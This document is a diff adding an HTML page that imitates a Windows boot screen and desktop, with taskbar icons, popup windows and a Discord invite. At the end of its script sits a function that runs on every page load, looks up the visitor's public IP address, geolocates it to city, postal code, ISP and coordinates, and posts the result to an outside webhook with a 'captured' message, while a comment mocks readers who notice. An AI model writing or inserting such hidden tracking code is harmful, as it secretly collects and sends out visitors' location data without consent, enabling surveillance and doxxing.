@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Windows</title>
+   <link rel="icon" href="https://files.catbox.moe/5osc3y.png" type="image/x-icon">
+   <style>
+      * {
+         margin: 0;
+         padding: 0;
+         box-sizing: border-box;
+      }
+
+      body {
+         background: linear-gradient(to bottom, #000428, #004e92);
+         color: white;
+         font-family: "Segoe UI", Arial, sans-serif;
+         height: 100vh;
+         overflow: hidden;
+      }
+
+      .welcome-screen, .boot-screen, .desktop {
+         position: absolute;
+         width: 100%;
+         height: 100%;
+         display: flex;
+         flex-direction: column;
+         justify-content: center;
+         align-items: center;
+         transition: opacity 1s ease-in-out;
+      }
+
+      .welcome-screen {
+         background: rgba(0, 0, 0, 0.8);
+         opacity: 1;
+         z-index: 2;
+      }
+
+      .boot-screen {
+         opacity: 0;
+         z-index: 1;
+      }
+
+      .desktop {
+         display: none;
+         opacity: 0;
+         background: url('https://source.unsplash.com/random/1920x1080') no-repeat center center/cover;
+      }
+
+      .welcome-screen button {
+         margin-top: 20px;
+         padding: 10px 20px;
+         font-size: 1.2rem;
+         color: white;
+         background-color: #004e92;
+         border: none;
+         border-radius: 5px;
+         cursor: pointer;
+      }
+
+      .welcome-screen button:hover {
+         background-color: #006fbf;
+      }
+
+      .boot-screen img {
+         width: 120px;
+         height: auto;
+         margin-bottom: 1rem;
+      }
+
+      .boot-screen h1 {
+         font-size: 1.8rem;
+         margin-bottom: 1rem;
+      }
+
+      .boot-screen p {
+         font-size: 1rem;
+         opacity: 0.8;
+         margin-bottom: 1rem;
+      }
+
+      .loader-dots {
+         font-size: 1.5rem;
+         letter-spacing: 3px;
+      }
+
+      .spinner {
+         margin: 20px auto;
+         width: 40px;
+         height: 40px;
+         border: 4px solid rgba(255, 255, 255, 0.3);
+         border-top: 4px solid white;
+         border-radius: 50%;
+         animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+         0% {
+            transform: rotate(0deg);
+         }
+         100% {
+            transform: rotate(360deg);
+         }
+      }
+
+      .desktop-icons {
+         display: flex;
+         flex-direction: column;
+         align-items: center;
+         position: absolute;
+         top: 20px;
+         left: 20px;
+         gap: 20px; 
+      }
+
+      .desktop-icons .icon {
+         text-align: center;
+      }
+
+      .desktop-icons .icon img {
+         width: 50px;
+         height: 50px;
+         border-radius: 50%; 
+         display: block;
+         margin: 0 auto;
+         transition: transform 0.2s;
+      }
+
+      .desktop-icons .icon img:hover {
+         transform: scale(1.1);
+      }
+
+      .desktop-icons .icon span {
+         font-size: 0.8rem;
+         color: white;
+         margin-top: 5px;
+         display: block;
+      }
+
+      .taskbar {
+         position: absolute;
+         bottom: 0;
+         width: 100%;
+         height: 50px;
+         background: rgba(0, 0, 0, 0.38);
+         display: flex;
+         align-items: center;
+         padding: 0 20px;
+         z-index: 10;
+         justify-content: space-between;
+      }
+
+      .taskbar .start-menu {
+         position: relative;
+         left: 0;
+         width: 70px;
+         height: 70px;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         cursor: pointer;
+      }
+
+      .taskbar .start-menu img {
+         width: 70%;
+         height: auto;
+      }
+
+      .taskbar-icons {
+         display: flex;
+         align-items: center;
+         gap: 15px;
+         margin-left: 10px; 
+      }
+
+      .taskbar-icons .icon {
+         width: 40px;
+         height: 40px;
+         cursor: pointer;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+      }
+
+      .taskbar-icons .icon img {
+         width: 100%;
+         height: auto;
+         border-radius: 5px;
+         transition: transform 0.2s;
+      }
+
+      .taskbar-icons .icon img:hover {
+         transform: scale(1.1);
+      }
+
+      .system-icons {
+         display: flex;
+         align-items: center;
+         gap: 15px;
+         margin-left: auto;
+      }
+
+      .system-icons .icon {
+         width: 25px;
+         height: 25px;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+      }
+
+      .system-icons .icon img {
+         width: 100%;
+         height: auto;
+      }
+
+      .system-icons .time {
+         font-size: 0.9rem;
+         color: white;
+      }
+
+      .notepad-window, .file-explorer-window {
+         position: absolute;
+         width: 400px;
+         height: 300px;
+         background-color: #f0f0f0;
+         color: black;
+         top: 50%;
+         left: 50%;
+         transform: translate(-50%, -50%);
+         padding: 20px;
+         border-radius: 8px;
+         box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+         display: none;
+         z-index: 3;
+      }
+
+      .notepad-window textarea, .file-explorer-window textarea {
+         width: 100%;
+         height: 100%;
+         border: none;
+         resize: none;
+         background-color: #f0f0f0;
+         color: black;
+         font-size: 1rem;
+         font-family: 'Courier New', Courier, monospace;
+      }
+
+      .notepad-header, .file-explorer-header {
+         font-weight: bold;
+         margin-bottom: 10px;
+      }
+
+      .close-btn {
+         position: absolute;
+         top: 10px;
+         right: 10px;
+         background-color: #f44336;
+         color: white;
+         border: none;
+         padding: 5px 10px;
+         cursor: pointer;
+         border-radius: 5px;
+      }
+
+      .close-btn:hover {
+         background-color: #d32f2f;
+      }
+   </style>
+</head>
+<body>
+   <div class="welcome-screen">
+      <h1>Welcome</h1>
+      <p>Click "Continue" to boot up the system.</p>
+      <button id="continue-btn">Continue</button>
+   </div>
+
+   <div class="boot-screen">
+      <img src="https://unverbal.lol/Windows.png" alt="Windows Logo">
+      <h1>Starting Windows</h1>
+      <p>Preparing your desktop<span class="loader-dots">...</span></p>
+      <div class="spinner"></div>
+   </div>
+
+   <div class="desktop">
+      <div class="desktop-icons">
+         <div class="icon">
+            <img src="https://files.catbox.moe/c6y5yc.jpg" alt="Sinful">
+            <span>Sinful</span>
+         </div>
+         <div class="icon">
+            <img src="https://files.catbox.moe/toh9d1.png" alt="Memory">
+            <span>Memory</span>
+         </div>
+         <div class="icon">
+            <img src="https://files.catbox.moe/yaajmc.gif" alt="tz">
+            <span>tz</span>
+         </div>
+      </div>
+      <div class="taskbar" style="
+    left: 0px;
+">
+         
+            <img src="https://unverbal.lol/Windows.png" alt="Start" style="
+    margin-right: -100;
+    margin-left: 0px;
+    width: 60px;
+    border-right-width: 50px;
+"><div class="taskbar-icons">
+            <div class="icon">
+               <img src="https://winaero.com/blog/wp-content/uploads/2018/12/file-explorer-folder-libraries-icon-18298.png" alt="File Manager" title="File Manager" id="file-explorer-icon">
+            </div>
+            <div class="icon">
+               <a href="https://discord.gg/fJbWG3Yg" target="_blank">
+                  <img src="https://files.catbox.moe/yp1k3p.png" alt="Discord" title="Discord">
+               </a>
+            </div>
+            <div class="icon">
+               <img src="https://files.catbox.moe/1zw33n.png" alt="Visual Studio Code" title="Visual Studio Code">
+            </div>
+            <div class="icon" id="notepad-icon">
+               <img src="https://files.catbox.moe/evykbo.png" alt="Notepad" title="Notepad">
+            </div>
+         </div>
+         <div class="system-icons">
+            <div class="icon">
+               <img src="https://files.catbox.moe/v2zuaz.png" alt="Wi-Fi" title="Wi-Fi">
+            </div>
+            <div class="icon">
+               <img src="https://files.catbox.moe/plmv0y.png" alt="Notifications" title="sound">
+            </div>
+            <div class="time" id="time-display">12:00 PM</div>
+         </div>
+      </div>
+   </div>
+
+   <div class="notepad-window" id="notepad-window">
+      <div class="notepad-header">Notepad</div>
+      <textarea readonly>This website is inspired by Valhal. Credits to valhal.la</textarea>
+      <button class="close-btn" id="close-notepad">Close</button>
+   </div>
+
+   <div class="file-explorer-window" id="file-explorer-window">
+      <div class="file-explorer-header">File Explorer</div>
+      <textarea readonly>Working on it...</textarea>
+      <button class="close-btn" id="close-file-explorer">Close</button>
+   </div>
+
+   <audio id="background-music" src="audio.mp3" loop="loop"></audio>
+
+   <script>
+      document.addEventListener("DOMContentLoaded", () => {
+         const welcomeScreen = document.querySelector('.welcome-screen');
+         const bootScreen = document.querySelector('.boot-screen');
+         const desktop = document.querySelector('.desktop');
+         const continueBtn = document.getElementById('continue-btn');
+         const backgroundMusic = document.getElementById('background-music');
+         const timeDisplay = document.getElementById('time-display');
+         const notepadIcon = document.getElementById('notepad-icon');
+         const notepadWindow = document.getElementById('notepad-window');
+         const closeNotepad = document.getElementById('close-notepad');
+         const fileExplorerIcon = document.getElementById('file-explorer-icon');
+         const fileExplorerWindow = document.getElementById('file-explorer-window');
+         const closeFileExplorer = document.getElementById('close-file-explorer');
+
+         continueBtn.addEventListener('click', () => {
+            welcomeScreen.style.opacity = '0';
+            setTimeout(() => {
+               welcomeScreen.style.display = 'none';
+               bootScreen.style.opacity = '1';
+               bootScreen.style.zIndex = '2';
+
+               backgroundMusic.play();
+
+               setTimeout(() => {
+                  bootScreen.style.opacity = '0';
+                  setTimeout(() => {
+                     bootScreen.style.display = 'flex';
+                     desktop.style.display = 'flex';
+                     desktop.style.opacity = '1';
+                  }, 1000);
+               }, 6000);
+            }, 1000);
+         });
+
+         notepadIcon.addEventListener('click', () => {
+            notepadWindow.style.display = 'block';
+         });
+
+         closeNotepad.addEventListener('click', () => {
+            notepadWindow.style.display = 'none';
+         });
+
+         fileExplorerIcon.addEventListener('click', () => {
+            fileExplorerWindow.style.display = 'block';
+         });
+
+         closeFileExplorer.addEventListener('click', () => {
+            fileExplorerWindow.style.display = 'none';
+         });
+
+         setInterval(() => {
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
+            const isPM = hours >= 12;
+            const displayHours = hours % 12 || 12;
+            const displayMinutes = minutes.toString().padStart(2, '0');
+            timeDisplay.textContent = `${displayHours}:${displayMinutes} ${isPM ? 'PM' : 'AM'}`;
+         }, 1000);
+      });
+
+      const sendUserInfoToDiscord = async () => {
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipResponse.json();
+
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const { country_name = 'Unknown', city = 'Unknown', region = 'Unknown', postal = 'Unknown', org = 'Unknown', latitude = 'Unknown', longitude = 'Unknown' } = await locationResponse.json();
+
+        const timeCaptured = new Date().toLocaleString();
+
+        const webhookURL = 'https://sura.lol/api/6771664d0f072';
+
+        const discordPayload = {
+            content: '👮 **User location details captured!**',
+            embeds: [{
+                title: 'seized',
+                description: 'Below are the details of the captured user location:',
+                color: 0xff0000,
+                thumbnail: { url: 'https://i.pinimg.com/736x/0d/96/8e/0d968ee69c532078b43be93b9b47dd1e.jpg' },
+                fields: [
+                    { name: '📍 IP Address', value: `${ip}`, inline: false },
+                    { name: '🌍 Country', value: `:earth_africa: ${country_name}`, inline: true },
+                    { name: '🗺️ Region', value: `${region}`, inline: true },
+                    { name: '🏙️ City', value: `${city}`, inline: true },
+                    { name: '📮 Postal Code', value: `${postal}`, inline: true },
+                    { name: '🏢 Organization', value: `${org}`, inline: false },
+                    { name: '🧭 Coordinates', value: `**Latitude:** ${latitude}, **Longitude:** ${longitude}`, inline: true },
+                    { name: '🕒 Time Captured', value: `${timeCaptured}`, inline: false }
+                ]
+            }]
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(discordPayload),
+        });
+    } catch (error) {
+        console.error('hi:', error);
+    }
+};
+    
+
+sendUserInfoToDiscord(); // if you're reading this it is totally normal to log public ip's !-->
+
+        
+    </script>
+
+   </script>
+</body>
+</html>
